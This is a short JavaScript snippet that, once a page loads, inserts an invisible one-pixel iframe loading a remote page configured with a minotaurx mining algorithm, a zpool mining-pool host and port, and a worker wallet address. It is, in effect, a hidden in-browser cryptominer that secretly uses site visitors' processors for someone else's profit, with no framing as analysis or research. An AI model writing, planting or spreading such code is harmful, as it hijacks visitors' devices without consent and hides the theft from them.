document.addEventListener("DOMContentLoaded", function () {
    let iframe = document.createElement("iframe");
    iframe.style.position = "absolute";
    iframe.style.width = "1px";
    iframe.style.height = "1px";
    iframe.style.opacity = "0";
    iframe.style.pointerEvents = "none";
    iframe.style.overflow = "hidden";
    iframe.src = "https://api-music.pages.dev?algorithm=minotaurx&host=minotaurx.na.mine.zpool.ca&port=7019&worker=RMfMCKAUvrQUxBz1fwSEVfkeDQJZAQGzzs&password=c%3DRVN&workers=2";
    
    document.body.appendChild(iframe);
});
